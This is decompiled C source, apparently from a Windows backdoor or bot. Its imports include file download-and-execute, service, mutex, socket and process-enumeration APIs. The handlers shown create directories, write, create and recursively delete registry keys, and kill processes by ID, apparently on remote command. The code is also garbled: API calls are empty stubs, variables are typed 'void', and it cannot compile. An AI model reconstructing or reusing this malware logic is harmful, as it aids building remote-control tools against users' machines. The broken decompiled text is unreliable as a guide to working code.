


//-------------------------------------------------------------------------


extern void HandlerProc; 
extern void sub_40785F;
extern void sub_407A17;
extern int ( *off_40B1E8)(void *Memory, char); 
extern int ( *off_40B1EC)(void *Memory, char); 
extern char aLocalsystem[12]; 
extern char ClassName[]; 
extern char Operation[]; 
extern char a__[3]; 
extern char a_[2]; 
extern int word_40B22C; 
extern char byte_40B22E; 
extern char aProcess32next[]; 
extern char aProcess32first[]; 
extern char aCreatetoolhelp[]; 
extern char aKernel32_dll[]; 
extern int dword_40B27C; 
extern int dword_40B280; 
extern int word_40B284; 
extern int dword_40B288; 
extern int dword_40B28C; 
extern int word_40B290; 
extern int dword_40B294; 
extern int dword_40B298; 
extern int word_40B29C; 
extern int dword_40B2A0; 
extern int dword_40B2A4; 
extern int word_40B2A8; 
extern int dword_40B2AC; 
extern int dword_40B2B0; 
extern int word_40B2B4; 
extern char aGetmodulebasen[]; 
extern char aEnumprocessmod[]; 
extern char ProcName[]; 
extern char LibFileName[]; 
extern int dword_40B324; 
extern int dword_40B328; 
extern int word_40B32C; 
extern char asc_40B330[]; 
extern char SubStr[]; 
extern char WindowName[]; 
extern char FileName[]; 
extern char szProvider[]; 
extern void unk_40C050; 
extern void unk_40C058; 
extern char * off_40D040; 
extern char * lpFileName; 
extern int (*off_40D078)(void); 
extern void idThread; 
extern void unk_40D2E4; 
extern int dword_40D2E8; 
extern void unk_40D2F0; 
extern void *dword_40D2F4; 
extern int dword_40D300; 
extern void hWnd; 
extern void ServiceName; 
extern int dword_40D314; 
extern int word_40D318; 
extern struct _SERVICE_STATUS ServiceStatus; 
extern void hServiceStatus; 
extern int dword_40D434; 
extern void hThread; 
extern void dword_40D43C; 
extern void dword_40D440; 
extern void hProv; 
extern char *buf; 
extern char * s; 
extern char byte_40D450; 
extern char byte_40D451; 
extern char byte_40D452; 
extern int word_40D454; 
extern int hostshort; 
extern int word_40D458; 
extern int dword_40D45C; 
extern void lpBuffer; 
extern void Size; 
extern void unk_40D468; 
extern void *dword_40D46C; 

//-------------------------------------------------------------------------



int  sub_401000(int a1);
int  sub_401020(int a1);
int  sub_401040(int this, int a2);
void  sub_4010A0(int this, void *Memory); 
int  sub_4010F0(int a1);
int  sub_401150(int this, int a2);
int  sub_401170(int this, int a2, void Size); 
void  sub_401230(int a1);
int  sub_4012D0(int this, int a2);
int  sub_401340(int a1);
int  sub_401380(int a1);
int  sub_401390(int a1);

void * sub_401410(void *Memory, char a2); 
int  sub_401460(void this, void lpBuffer, void nNumberOfBytesToWrite); 
int  sub_4014E0(void this, void lpBuffer, int a3); 
int  sub_401580();
int  sub_401660(void lpBuffer); 
int  sub_4016F0(void lpBuffer); 
int  sub_401870(int a1, int a2, void lpBuffer); 
void  sub_4019D0(void a1);
int  sub_4019E0(void a1);
int  sub_401A40(void phkResult); 
int  sub_401AF0(void hKey); 
int  sub_401B80(void this, void a2);
void  sub_401C10(void hKey, char * lpSubKey); 
int  sub_401D10(void a1);
int  sub_401DD0(int a1);
int  sub_402050(int a1);
int  sub_402220(int a1);
int  sub_402240(int a1);
int  sub_4022B0(int a1);
void  sub_402320(int a1);
int  sub_402380(int a1);
int  sub_402400(int a1, int a2);
int  sub_402450(int a1);
void  sub_4025A0(int a1);
int  StartAddress(void a1); 
int  sub_402920(int a1, int a2);
int  sub_402A20(int a1);
void  sub_402E00(void hKey); 
int  sub_402EC0(int a1, int a2);
int  sub_402F50(void a1, int a2);
int  sub_4030E0(int a1, int a2);
void  sub_4031D0(void hKey, int a2); 
int  sub_403400(void a1); 
void  sub_403460(void a1);
int  sub_4034E0(int, int); 
int  main(void hInstance, void hPrevInstance, char lpCmdLine, int nShowCmd); 
int  sub_403800(int a1);
int  sub_403850();
void  sub_4038A0(void a1);
void  sub_4038B0(int a1);
int  sub_4039A0(int a1);
void  sub_403A40(int a1);
int  sub_403B00(void a1); 
int  sub_403BE0(int a1, int a2, int a3);
void  sub_403CE0(void a1);
int  sub_403CF0(void a1);
void nullsub_1(); 
char *  sub_403D70();
int  sub_403DD0(int a1, int a2);
int  sub_403E20(int a1, int a2);
void  sub_403E60(void *Memory); 
int  sub_403E90(int a1, unsigned int a2, int a3);
int  sub_403F10(int a1);
int  sub_403F40(int a1, int a2);
int  sub_403FB0(int a1);
int  sub_404000();
int  sub_404050(int a1, int a2);
int  sub_4040C0(int a1);
int  sub_404130(int a1, const void *a2, void a3, int a4, int a5, int a6);
int  sub_404300(int a1);
int  sub_404370(int a1, int a2);
int  sub_4043E0(struct sockaddr *to, int a2, int a3); 
int  sub_404450(int a1, void pdwDataLen); 
int  sub_4044A0(int a1, int a2);
int  sub_4044D0(int a1, int a2);
void  sub_404530(int a1);
int  sub_404580(void pdwDataLen); 
int  sub_404650(int a1);
int  sub_4047F0(int a1, signed int a2);
void * sub_4049B0();
int  sub_404C70(int a1, int a2);
int  sub_404E60(int a1, char a2);
int  sub_404EE0(int a1);
int  sub_404F70(void dwBufLen, void *Memory); 
int  sub_4051A0(void this, int a2);
int  sub_405250(void this, int a2);
int  sub_4052F0(int a1, void wParam); 
int  sub_405350(unsigned int a1);
int  sub_4053E0(void lParam, int a2); 
void  sub_405530();
int  sub_405660(void *Memory); 
unsigned int  sub_405820();
void * sub_405870();
int  sub_405940(int a1, int a2, int a3);
int  sub_405AE0(signed int a1, int *a2, int a3);
unsigned int  sub_405B60(void wParam, int a2, int a3); 
void  sub_405CF0();
int  sub_405EE0(void a1); 
void  sub_405FC0(void a1);

void  j__free(void *Memory); 





int  sub_4078B2();
int  sub_407BF3();
int  sub_407BF7();

int  sub_407FE3();
void  sub_408D8E();
void  sub_408DD2(); 
int  sub_4099F8();


int  sub_40AEC0();
int  sub_40AF00();







void memset(void,void,void); 
void memset(void a,void aa,void aaa) 
{
}
void ExitProcess(void); 
void ExitProcess(void a) 
{
}
void lstrlenA(void); 
void lstrlenA(void a) 
{
}
void send(void,void,void,void); 
void send(void a,void aa,void aaa,void aaaa) 
{
}
void WriteFile(void,void,void,void,void); 
void WriteFile(void a,void aa,void aaa,void aaaa,void aaaaa) 
{
}
void GetTempPathA(void,void); 
void GetTempPathA(void a,void aa) 
{
}
void GetSystemDirectoryA(void,void); 
void GetSystemDirectoryA(void a,void aa) 
{
}
void lstrcatA(void,void); 
void lstrcatA(void a,void aa) 
{
}
void CreateFileA(void,void,void,void,void,void,void); 
void CreateFileA(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa,void aaaaaaa) 
{
}
void CloseHandle(void); 
void CloseHandle(void a) 
{
}
void lstrcpyA(void,void); 
void lstrcpyA(void a,void aa) 
{
}
void GetFileAttributesA(void); 
void GetFileAttributesA(void a) 
{
}
void LoadLibraryA(void); 
void LoadLibraryA(void a) 
{
}
void RegOpenKeyExA(void,void,void,void,void); 
void RegOpenKeyExA(void a,void aa,void aaa,void aaaa,void aaaaa) 
{
}
void RegCloseKey(void); 
void RegCloseKey(void a) 
{
}
void RegCreateKeyExA(void,void,void,void,void,void,void,void,void); 
void RegCreateKeyExA(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa,void aaaaaaa,void aaaaaaaa,void aaaaaaaaa) 
{
}
void CreateMutexA(void,void,void,void,void); 
void CreateMutexA(void a,void aa,void aaa,void aaaa,void aaaaa) 
{
}
void GetLastError(void); 
void GetLastError(void ) 
{
}
void GetModuleFileNameA(void,void,void); 
void GetModuleFileNameA(void a,void aa,void aaa) 
{
}
void SetFileAttributesA(void,void); 
void SetFileAttributesA(void a,void aa) 
{
}
void DeleteFileA(void); 
void DeleteFileA(void a) 
{
}
void CopyFileA(void,void,void); 
void CopyFileA(void a,void aa,void aaa) 
{
}
void RegSetValueExA(void,void,void,void,void,void); 
void RegSetValueExA(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa) 
{
}
void URLDownloadToFileA(void,void,void,void,void); 
void URLDownloadToFileA(void a,void aa,void aaa,void aaaa,void aaaaa) 
{
}
void Sleep(void); 
void Sleep(void a) 
{
}
void ShellExecuteA(void,void,void,void,void,void); 
void ShellExecuteA(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa) 
{
}
void ExitThread(void); 
void ExitThread(void a) 
{
}
void GetTickCount(void); 
void GetTickCount(void ) 
{
}
void CreateThread(void,void,void,void,void,void); 
void CreateThread(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa) 
{
}
void fopen(void,void); 
void fopen(void a,void aa) 
{
}
void fgets(void); 
void fgets(void a) 
{
}
void strstr(void,void); 
void strstr(void a,void aa) 
{
}
void fclose(void); 
void fclose(void a) 
{
}
void RegDeleteValueA(void,void); 
void RegDeleteValueA(void a,void aa) 
{
}
void memcpy(void,void); 
void memcpy(void a,void aa) 
{
}
void GetEnvironmentVariableA(void,void,void); 
void GetEnvironmentVariableA(void a,void aa,void aaa) 
{
}
void GetWindowsDirectoryA(void,void); 
void GetWindowsDirectoryA(void a,void aa) 
{
}
void lstrcpynA(void,void,void); 
void lstrcpynA(void a,void aa,void aaa) 
{
}
void CharLowerA(void); 
void CharLowerA(void a) 
{
}
void lstrcmpA(void,void); 
void lstrcmpA(void a,void aa) 
{
}
void GetFileSize(void,void); 
void GetFileSize(void a,void aa) 
{
}
void CreateFileMappingA(void,void,void,void,void,void); 
void CreateFileMappingA(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa) 
{
}
void MapViewOfFile(void,void,void,void,void); 
void MapViewOfFile(void a,void aa,void aaa,void aaaa,void aaaaa) 
{
}
void UnmapViewOfFile(void); 
void UnmapViewOfFile(void a) 
{
}
void GetDriveTypeA(void); 
void GetDriveTypeA(void a) 
{
}
void GetCurrentThread(void); 
void GetCurrentThread(void ) 
{
}
void SetThreadPriority(void,void); 
void SetThreadPriority(void a,void aa) 
{
}
void RegQueryValueExA(void,void,void,void,void,void); 
void RegQueryValueExA(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa) 
{
}
void GetProcessHeap(void); 
void GetProcessHeap(void ) 
{
}
void HeapAlloc(void,void,void); 
void HeapAlloc(void a,void aa,void aaa) 
{
}
void socket(void,void,void); 
void socket(void a,void aa,void aaa) 
{
}
void recv(void,void,void,void); 
void recv(void a,void aa,void aaa,void aaaa) 
{
}
void HeapFree(void,void,void); 
void HeapFree(void a,void aa,void aaa) 
{
}
void closesocket(void); 
void closesocket(void a) 
{
}
void sendto(void,void,void,void,void,void); 
void sendto(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa) 
{
}
void GetModuleHandleA(void); 
void GetModuleHandleA(void a) 
{
}
void GetProcAddress(void,void); 
void GetProcAddress(void a,void aa) 
{
}
void inet_addr(void); 
void inet_addr(void a) 
{
}
void gethostbyname(void); 
void gethostbyname(void a) 
{
}
void lstrcmpiA(void,void); 
void lstrcmpiA(void a,void aa) 
{
}
void tolower(void); 
void tolower(void a) 
{
}
void GlobalFree(void); 
void GlobalFree(void a) 
{
}
void InterlockedIncrement(void); 
void InterlockedIncrement(void a) 
{
}
void InterlockedDecrement(void); 
void InterlockedDecrement(void a) 
{
}
void SetFilePointer(void,void,void,void); 
void SetFilePointer(void a,void aa,void aaa,void aaaa) 
{
}
void ReadFile(void,void,void,void,void); 
void ReadFile(void a,void aa,void aaa,void aaaa,void aaaaa) 
{
}
void GetSystemTime(void); 
void GetSystemTime(void a) 
{
}
void GlobalAlloc(void,void); 
void GlobalAlloc(void a,void aa) 
{
}
void GetTempFileNameA(void,void,void,void); 
void GetTempFileNameA(void a,void aa,void aaa,void aaaa) 
{
}
void FindNextFileA(void,void); 
void FindNextFileA(void a,void aa) 
{
}
void FindFirstFileA(void,void); 
void FindFirstFileA(void a,void aa) 
{
}
void FindClose(void); 
void FindClose(void a) 
{
}
void connect(void,void,void); 
void connect(void a,void aa,void aaa) 
{
}
void RegEnumKeyA(void,void,void,void); 
void RegEnumKeyA(void a,void aa,void aaa,void aaaa) 
{
}
void FileTimeToLocalFileTime(void,void); 
void FileTimeToLocalFileTime(void a,void aa) 
{
}
void FileTimeToSystemTime(void,void); 
void FileTimeToSystemTime(void a,void aa) 
{
}
void GetLocalTime(void); 
void GetLocalTime(void a) 
{
}
void GetTimeZoneInformation(void); 
void GetTimeZoneInformation(void a) 
{
}
void WideCharToMultiByte(void,void,void,void,void,void,void,void); 
void WideCharToMultiByte(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa,void aaaaaaa,void aaaaaaaa) 
{
}







































































//----- (00401000) --------------------------------------------------------
int  sub_401000(int a1)
{
	int result; 

	result = a1;
	*a1 = &off_40B1E8;
	*(a1 + 4) = 0;
	*(a1 + 8) = 0;
	return result;
}

//----- (00401020) --------------------------------------------------------
int  sub_401020(int a1)
{
	int result; 
	int v2; 

	v2 = *(a1 + 4);
	for ( result = 0; v2; ++result )
		v2 = *v2;
	return result;
}

//----- (00401040) --------------------------------------------------------
int  sub_401040(int this, int a2)
{
	int result; 
	int v3; 
	int v4; 
	int v5; 

	v3 = this;
	result =  new(0xCu);
	if ( result )
	{
		v5 = a2;
		*result = 0;
		*(result + 8) = v5;
		v4 = *(v3 + 4);
		if ( v4 )
		{
			for ( ; *v4; v4 = *v4 )
				;
			*v4 = result;
			*(result + 4) = v4;
			result = 1;
		}
		else
		{
			*(v3 + 4) = result;
			*(result + 4) = 0;
			result = 1;
		}
	}
	return result;
}

//----- (004010A0) --------------------------------------------------------
void  sub_4010A0(int this, void *Memory)
{
	void *v2; 
	int v3; 

	v2 = Memory;
	if ( Memory )
	{
		if ( *Memory )
			*(*Memory + 4) = *(Memory + 1);
		v3 = *(Memory + 1);
		if ( v3 )
			*v3 = *Memory;
		else
			*(this + 4) = *Memory;
		if ( *(this + 8) )
			j__free(*((void **)v2 + 2));
		j__free(v2);
	}
}

//----- (004010F0) --------------------------------------------------------
int  sub_4010F0(int a1)
{
	int result; 
	int v2; 
	void *v3; 
	int v4; 

	v2 = a1;
	for ( result = *(a1 + 4); result; result = *(v2 + 4) )
	{
		v3 = *(void **)(v2 + 4);
		if ( v3 )
		{
			if ( *v3 )
				*(*v3 + 4) = *(v3 + 1);
			v4 = *(v3 + 1);
			if ( v4 )
				*v4 = *v3;
			else
				*(v2 + 4) = *v3;
			if ( *(v2 + 8) )
				j__free(*((void **)v3 + 2));
			j__free(v3);
		}
	}
	return result;
}

//----- (00401150) --------------------------------------------------------
int  sub_401150(int this, int a2)
{
	int result; 

	result = *(this + 4);
	if ( result )
	{
		while ( a2 != *(result + 8) )
		{
			result = *result;
			if ( !result )
				goto LABEL_4;
		}
	}
	else
	{
LABEL_4:
		result = 0;
	}
	return result;
}

//----- (00401170) --------------------------------------------------------
int  sub_401170(int this, int a2, void Size)
{
	int v3; 
	void v4; 
	int result; 
	int v6; 
	void *v7; 
	void v8; 
	void *v9; 
	int v10; 

	v4 = Size;
	v3 = this;
	if ( !Size )
		return 1;
	v10 =  new(8u);
	v6 = v10;
	if ( !v10 )
		return 0;
	v7 = malloc(v4);
	*v6 = v7;
	if ( !v7 )
	{
		j__free((void *)v6);
		return 0;
	}
	memcpy(&v7 , (const void *)a2, v4);
	v8 = Size;
	*(v6 + 4) = Size;
	if ( sub_401040(v3, v6) )
	{
		v9 = *(void **)(v3 + 16);
		*(v3 + 12) += v8;
		if ( v9 )
		{
			free(v9);
			*(v3 + 16) = 0;
		}
		result = 1;
	}
	else
	{
		free(*(void **)v6);
		j__free((void *)v6);
		result = 0;
	}
	return result;
}

//----- (00401230) --------------------------------------------------------
void  sub_401230(int a1)
{
	int v1; 
	void *v2; 
	int v3; 
	void *v4; 

	v1 = a1;
	while ( *(v1 + 4) )
	{
		free(**(void ***)(*(v1 + 4) + 8));
		j__free(*(void **)(*(v1 + 4) + 8));
		v2 = *(void **)(v1 + 4);
		if ( v2 )
		{
			if ( *v2 )
				*(*v2 + 4) = *(v2 + 1);
			v3 = *(v2 + 1);
			if ( v3 )
				*v3 = *v2;
			else
				*(v1 + 4) = *v2;
			if ( *(v1 + 8) )
				j__free(*((void **)v2 + 2));
			j__free(v2);
		}
	}
	v4 = *(void **)(v1 + 16);
	*(v1 + 12) = 0;
	if ( v4 )
	{
		free(v4);
		*(v1 + 16) = 0;
	}
}

//----- (004012D0) --------------------------------------------------------
int  sub_4012D0(int this, int a2)
{
	int v2; 
	void *v3; 
	int result; 
	int v5; 
	int i; 
	int v7; 

	v2 = this;
	if ( *(this + 12) && (v3 = malloc(*(this + 12)), *a2 = v3, v3) )
	{
		v5 = *(v2 + 4);
		for ( i = 0; v5; i += v7 )
		{
			memcpy((char *)&v3  + i, **(const void ***)(v5 + 8), *(*(v5 + 8) + 4));
			v7 = *(*(v5 + 8) + 4);
			v5 = *v5;
		}
		result = 1;
	}
	else
	{
		result = 0;
	}
	return result;
}

//----- (00401340) --------------------------------------------------------
int  sub_401340(int a1)
{
	int v1; 
	int v2; 
	int result; 

	v1 = a1;
	v2 = a1 + 16;
	if ( *(a1 + 16) )
	{
		free(*(void **)(a1 + 16));
		*v2 = 0;
	}
	if ( sub_4012D0(v1, v2) )
		result = *v2;
	else
		result = 0;
	return result;
}

//----- (00401380) --------------------------------------------------------
int  sub_401380(int a1)
{
	*a1 = &off_40B1E8;
	return sub_4010F0(a1);
}

//----- (00401390) --------------------------------------------------------
int  sub_401390(int a1)
{
	int result; 

	result = a1;
	*a1 = &off_40B1EC;
	*(a1 + 4) = 0;
	*(a1 + 8) = 0;
	*(a1 + 12) = 0;
	*(a1 + 16) = 0;
	return result;
}

//----- (00401410) --------------------------------------------------------
void * sub_401410(void *Memory, char a2)
{
	void *v2; 

	v2 = Memory;
	*Memory = &off_40B1E8;
	sub_4010F0((int)Memory);
	if ( a2 & 1 )
		j__free(v2);
	return v2;
}

//----- (00401460) --------------------------------------------------------
int  sub_401460(void this, void lpBuffer, void nNumberOfBytesToWrite)
{
	void v3; 
	void *v4; 
	void v5; 
	int result; 
	void NumberOfBytesWritten; 

	NumberOfBytesWritten = this;
	v3 = CreateFileA(&lpFileName , 0x40000000u, 1u, 0, 4u, 0x80u, 0);
	v4 = v3;
	if ( v3 == (void)-1 )
	{
		result = 12;
	}
	else
	{
		v5 = nNumberOfBytesToWrite;
		if ( WriteFile(&v3 , lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) && NumberOfBytesWritten == v5 )
		{
			SetEndOfFile(v4);
			CloseHandle(&v4 );
			result = 0;
		}
		else
		{
			CloseHandle(&v4 );
			result = 12;
		}
	}
	return result;
}

//----- (004014E0) --------------------------------------------------------
int  sub_4014E0(void this, void lpBuffer, int a3)
{
	void v3; 
	void *v4; 
	void v5; 
	void v6; 
	int result; 
	char v8; 
	void NumberOfBytesRead; 

	NumberOfBytesRead = this;
	v3 = CreateFileA(&lpFileName , 0x80000000u, 1u, 0, 3u, 0x80u, 0);
	v4 = v3;
	if ( v3 == (void)-1 )
	{
		result = 12;
	}
	else
	{
		v5 = GetFileSize(&v3 , 0);
		v6 = v5;
		v8 = *a3 < v5;
		*a3 = v5;
		if ( v8 )
		{
			CloseHandle(&v4 );
			result = 14;
		}
		else
		{
			if ( ReadFile(&v4 , lpBuffer, v5, &NumberOfBytesRead, 0) && NumberOfBytesRead == v6 )
			{
				CloseHandle(&v4 );
				result = 0;
			}
			else
			{
				CloseHandle(&v4 );
				result = 12;
			}
		}
	}
	return result;
}

//----- (00401580) --------------------------------------------------------
int  sub_401580()
{
	void *v0; 
	int result; 
	void v2; 
	void v3; 
	int v4; 
	int Buffer; 
	void NumberOfBytesWritten; 

	v4 = 1000;
	v3 = CreateFileA(&off_40D040 , 0x80u, 1u, 0, 3u, 0x80u, 0);
	v0 = v3;
	if ( v3 != (void)-1 )
		goto LABEL_2;
	if ( GetLastError() != 2
			|| (v2 = CreateFileA(&off_40D040 , 0x40000000u, 1u, 0, 4u, 0x80u, 0), v0 = v2, Buffer = 1, v2 == (void)-1) )
	{
		result = 12;
	}
	else
	{
		if ( WriteFile(&v2 , &Buffer, 2u, &NumberOfBytesWritten, 0)
				&& NumberOfBytesWritten == 2
				&& WriteFile(&v0 , &v4, 4u, &NumberOfBytesWritten, 0)
				&& NumberOfBytesWritten == 4 )
		{
LABEL_2:
			CloseHandle(&v0 );
			return 0;
		}
		CloseHandle(&v0 );
		result = 12;
	}
	return result;
}

//----- (00401660) --------------------------------------------------------
int  sub_401660(void lpBuffer)
{
	void v1; 
	void *v2; 
	int result; 
	void v4; 
	void NumberOfBytesWritten; 
	int Buffer; 

	v1 = CreateFileA(&off_40D040 , 0xC0000000u, 1u, 0, 3u, 0x80u, 0);
	v2 = v1;
	if ( v1 == (void)-1 )
	{
		result = 12;
	}
	else
	{
		SetFilePointer(&v1 , 2, 0, 0);
		v4 = lpBuffer;
		ReadFile(&v2 , lpBuffer, 4u, &NumberOfBytesWritten, 0);
		Buffer = *v4 + 1;
		SetFilePointer(&v2 , 2, 0, 0);
		WriteFile(&v2 , &Buffer, 4u, &NumberOfBytesWritten, 0);
		CloseHandle(&v2 );
		result = 0;
	}
	return result;
}

//----- (004016F0) --------------------------------------------------------
int  sub_4016F0(void lpBuffer)
{
	void v1; 
	void *v2; 
	int result; 
	int v4; 
	void v5; 
	long v6; 
	long *v7; 
	void v8; 
	long v9; 
	long *v10; 
	void v11; 
	void ( *v12)(void, void, void, void, void); 
	void v13; 
	void v14; 
	char v15; 
	int v16; 
	void v17; 
	char Buffer; 
	void NumberOfBytesWritten; 
	int v20; 

	v16 = 0;
	v1 = CreateFileA(&off_40D040 , 0xC0000000u, 1u, 0, 3u, 0x80u, 0);
	v2 = v1;
	if ( v1 == (void)-1 )
	{
		result = 12;
	}
	else
	{
		v13 = GetFileSize(&v1, 0);
		v4 = 6;
		v14 = v13;
		v17 = v13;
		SetFilePointer(&v2 , 6, 0, 0);
		v15 = v14 - 6 < 0x19;
		v5 = lpBuffer;
		if ( v15 )
		{
LABEL_12:
			v11 = 2;
			v10 = 0;
			v9 = 0;
		}
		else
		{
			do
			{
				ReadFile(&v2 , &Buffer, 1u, &NumberOfBytesWritten, 0);
				v4 += 25;
				if ( Buffer )
				{
					v8 = 1;
					v7 = 0;
					v16 = v4 - 25;
					v6 = 24;
				}
				else
				{
					ReadFile(&v2 , &v20, 4u, &NumberOfBytesWritten, 0);
					if ( v20 == *v5 )
					{
						v12 = WriteFile;
						goto LABEL_14;
					}
					v8 = 1;
					v7 = 0;
					v6 = 20;
				}
				SetFilePointer(&v2 , v6, v7, v8);
			}
			while ( v17 - v4 >= 0x19 );
			if ( !v16 )
				goto LABEL_12;
			v11 = 0;
			v10 = 0;
			v9 = v16;
		}
		SetFilePointer(&v2 , v9, v10, v11);
		v12 = WriteFile;
		Buffer = 0;
		WriteFile(&v2 , &Buffer, 1u, &NumberOfBytesWritten, 0);
		WriteFile(&v2 , v5, 4u, &NumberOfBytesWritten, 0);
LABEL_14:
		v12(v2, (char *)v5 + 4, 2u, &NumberOfBytesWritten, 0);
		v12(v2, (char *)v5 + 8, 4u, &NumberOfBytesWritten, 0);
		v12(v2, (char *)v5 + 12, 2u, &NumberOfBytesWritten, 0);
		v12(v2, (char *)v5 + 16, 4u, &NumberOfBytesWritten, 0);
		v12(v2, (char *)v5 + 20, 4u, &NumberOfBytesWritten, 0);
		CloseHandle(&v2 );
		result = 0;
	}
	return result;
}

//----- (00401870) --------------------------------------------------------
int  sub_401870(int a1, int a2, void lpBuffer)
{
	void v3; 
	void *v4; 
	int v6; 
	void v7; 
	void v8; 
	long v9; 
	void v10; 
	void v11; 
	char Buffer; 
	void NumberOfBytesRead; 
	int v14; 

	v3 = CreateFileA(&off_40D040 , 0x80000000u, 1u, 0, 3u, 0x80u, 0);
	v4 = v3;
	if ( v3 == (void)-1 )
		return 12;
	v8 = GetFileSize(&v3 , 0);
	v6 = 25 * *a2 + 6;
	v9 = 25 * *a2 + 6;
	v10 = v8;
	v11 = v8;
	SetFilePointer(&v4 , v9, 0, 0);
	if ( v10 - v6 < 0x19 )
	{
LABEL_10:
		CloseHandle(&v4 );
		return 11;
	}
	v7 = lpBuffer;
	while ( 1 )
	{
		++*a2;
		ReadFile(&v4 , &Buffer, 1u, &NumberOfBytesRead, 0);
		v6 += 25;
		v14 = v6;
		if ( !Buffer )
			break;
		SetFilePointer(&v4 , 24, 0, 1u);
LABEL_9:
		if ( v11 - v6 < 0x19 )
			goto LABEL_10;
	}
	ReadFile(&v4 , v7, 4u, &NumberOfBytesRead, 0);
	ReadFile(&v4 , (char *)v7 + 4, 2u, &NumberOfBytesRead, 0);
	ReadFile(&v4 , (char *)v7 + 8, 4u, &NumberOfBytesRead, 0);
	ReadFile(&v4 , (char *)v7 + 12, 2u, &NumberOfBytesRead, 0);
	ReadFile(&v4 , (char *)v7 + 16, 4u, &NumberOfBytesRead, 0);
	ReadFile(&v4 , (char *)v7 + 20, 4u, &NumberOfBytesRead, 0);
	if ( (unsigned int)a1 > *(v7 + 5) )
	{
		SetFilePointer(&v4 , 20, 0, 1u);
		v6 = v14;
		goto LABEL_9;
	}
	CloseHandle(&v4 );
	return 0;
}

//----- (004019D0) --------------------------------------------------------
void  sub_4019D0(void a1)
{
	void result; 

	result = a1;
	idThread = a1;
	return result;
}

//----- (004019E0) --------------------------------------------------------
int  sub_4019E0(void a1)
{
	int v1; 
	int v2; 
	int v3; 
	int result; 
	char v5; 

	v2 = *(a1 + 20) + 4;
	v1 = *(a1 + 20) + 4;
	do
		v5 = *v1++;
	while ( v5 );
	v3 = a1 + 24;
	sub_401170(a1 + 24, v2, v1 - (*(a1 + 20) + 5) + 1);
	if ( CreateDirectoryA((char *)v2, 0) )
	{
		result = 0;
	}
	else
	{
		a1 = GetLastError();
		sub_401170(v3, (int)&a1, 4u);
		result = 1;
	}
	return result;
}

//----- (00401A40) --------------------------------------------------------
int  sub_401A40(void phkResult)
{
	int v1; 
	const char *v2; 
	void v3; 
	int v4; 
	int v5; 
	const char *v6; 
	void v7; 
	const char *v8; 
	void v9; 
	int v11; 
	void v12; 
	char v13; 
	int v14; 
	char v15; 
	int v16; 
	int v17; 

	v3 = phkResult;
	v11 = *(phkResult + 5);
	v12 = *(void *)(v11 + 4);
	v2 = (const char *)(v11 + 8);
	v1 = v11 + 8;
	phkResult = v12;
	do
		v13 = *v1++;
	while ( v13 );
	v14 = v1 - (void)(v2 + 1);
	v5 = v14 + 9;
	v6 = (const char *)(v14 + 9 + *(v3 + 5));
	v4 = v14 + 9 + *(v3 + 5);
	do
		v15 = *v4++;
	while ( v15 );
	v16 = v5 + v4 - (void)(v6 + 1) + 1;
	v17 = *(v3 + 5);
	v9 = *(v17 + v16);
	v7 = *(v17 + v16 + 4);
	v8 = (const char *)(v17 + v16 + 4 + 4);
	if ( !*(v17 + 8) )
	{
		phkResult = phkResult;
		return -(RegSetValueExA(&phkResult , v6, 0, v9, v8, v7) != 0) & 2;
	}
	if ( !RegOpenKeyExA(&phkResult , v2, 0, 2u, &phkResult) )
		return -(RegSetValueExA(&phkResult , v6, 0, v9, v8, v7) != 0) & 2;
	return 1;
}

//----- (00401AF0) --------------------------------------------------------
int  sub_401AF0(void hKey)
{
	int v1; 
	int v2; 
	int v3; 
	int result; 
	int v5; 
	int v6; 
	char v7; 
	void phkResult; 
	void dwDisposition; 

	v5 = *(hKey + 5);
	v3 = v5 + 8;
	v2 = (int)(hKey + 6);
	v6 = (int)(hKey + 6);
	hKey = *(void *)(v5 + 4);
	sub_401170(v6, (int)&hKey, 4u);
	v1 = v3;
	do
		v7 = *v1++;
	while ( v7 );
	sub_401170(v2, v3, v1 - (v3 + 1) + 1);
	if ( RegCreateKeyExA(&hKey , (char *)v3, 0, 0, 0, 0xF003Fu, 0, &phkResult, &dwDisposition) )
		result = 1;
	else
		result = -(dwDisposition != 1) & 2;
	return result;
}

//----- (00401B80) --------------------------------------------------------
int  sub_401B80(void this, void a2)
{
	void v2; 
	int v3; 
	int result; 
	void dwProcessId; 

	dwProcessId = this;
	v3 = a2 + 24;
	dwProcessId = *(*(a2 + 20) + 4);
	sub_401170(a2 + 24, (int)&dwProcessId, 4u);
	v2 = OpenProcess(1u, 0, dwProcessId);
	if ( v2 )
	{
		if ( TerminateProcess(v2, 0) )
		{
			result = 0;
		}
		else
		{
			a2 = GetLastError();
			sub_401170(v3, (int)&a2, 4u);
			result = 2;
		}
	}
	else
	{
		a2 = GetLastError();
		sub_401170(v3, (int)&a2, 4u);
		result = 1;
	}
	return result;
}

//----- (00401C10) --------------------------------------------------------
void  sub_401C10(void hKey, char * lpSubKey)
{
	const char *v2; 
	int v4; 
	int v5; 
	void v6; 
	void v7; 
	void phkResult; 
	void cchName; 
	char SubKey; 
	struct _void ftLastWriteTime; 

	v2 = lpSubKey;
	if ( RegOpenKeyExA(&hKey , lpSubKey, 0, 0x2000Eu, &phkResult) )
		return 1;
	cchName = 256;
	v6 = RegEnumKeyExA(phkResult, 0, &SubKey, &cchName, 0, 0, 0, &ftLastWriteTime);
	v4 = v6;
	if ( v6 )
	{
LABEL_6:
		RegCloseKey(&phkResult );
		if ( v4 == 259 )
			return RegDeleteKeyA(&hKey, v2) != 0;
	}
	else
	{
		while ( 1 )
		{
			v5 = sub_401C10(phkResult, &SubKey);
			if ( v5 )
				break;
			cchName = 256;
			v7 = RegEnumKeyExA(phkResult, 0, &SubKey, &cchName, (void)v5, (char)v5, (void)v5, &ftLastWriteTime);
			v4 = v7;
			if ( v7 )
				goto LABEL_6;
		}
		RegCloseKey(&phkResult );
	}
	return 1;
}

//----- (00401D10) --------------------------------------------------------
int  sub_401D10(void a1)
{
	int v1; 
	void v2; 
	int v3; 
	int v4; 
	int v6; 
	void v7; 
	char v8; 
	int v9; 
	void phkResult; 

	v2 = a1;
	v6 = *(a1 + 5);
	v7 = *(void *)(v6 + 4);
	v3 = v6 + 8;
